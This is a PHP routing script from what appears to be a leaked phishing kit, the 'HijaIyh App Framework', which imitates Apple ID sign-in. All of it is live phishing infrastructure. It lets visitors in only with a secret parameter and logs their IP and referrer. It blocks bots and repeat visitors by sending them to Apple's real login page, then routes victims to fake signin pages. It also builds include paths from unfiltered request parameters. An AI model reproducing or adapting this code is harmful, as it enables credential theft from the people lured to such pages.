<?php 
/*
    ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
    ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
    ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
    ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
    .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
    FuCked By [!]DNThirTeen
    https://www.facebook.com/groups/leakcode/
*/
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/
$appidkey = sha1($_SERVER['HTTP_USER_AGENT']);
if($core->is_mobile())
{
	$link ='?page=m.signin&appIdKey='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale;
	//$link = 'ap/m.signin?openid.pape.max_auth_age='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale;
}
else{

	$link ='?page=signin&appIdKey='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale;
}

if(empty($core->session('logged_in'))){

if(isset($_GET[$core->parse_hijaiyh('sp','param')]))
{
	$core->create_session(['logged_in' => $_SERVER['REMOTE_ADDR']]);
	$core->stats('visitor','Visitor source : '.$_SERVER['HTTP_REFERER']);

	$core->redirect($link);
	//header('location:?page=signin&appIdKey='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale);exit;
}else{
	
    $core->anti_loop();
	$core->suspend();exit;
}

}else{

if($core->parse_hijaiyh('sp','one_time') == 1){
if(isset($_SESSION['done']))
{
	$core->stats('bot','Access blocked by One Time Access');
	$blocker->one_time($core->userIP());
	$core->redirect('https://href.li/?https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD');
}
}

$page = @$_GET['page'];
$req = @$_GET['req'];
if(empty($page))
{
	if(!empty($req)){
		if(file_exists(HADIR.$iyh['app_path'].'/request/iyh_'.$req.'.php'))
		{
			require_once(HADIR.$iyh['app_path'].'/request/iyh_'.$req.'.php');
		}else{
			exit('error request');
		}
	}else{
		$core->redirect($link);
	}

}else{

	if(isset($page))
	{
		if(file_exists(HADIR.$iyh['app_path'].'/action/iyh_'.strtolower($page).'.php'))
		{
			require_once(HADIR.$iyh['app_path'].'/action/iyh_'.strtolower($page).'.php');
		}else{
			exit('error');
		}
	}
}

}
?>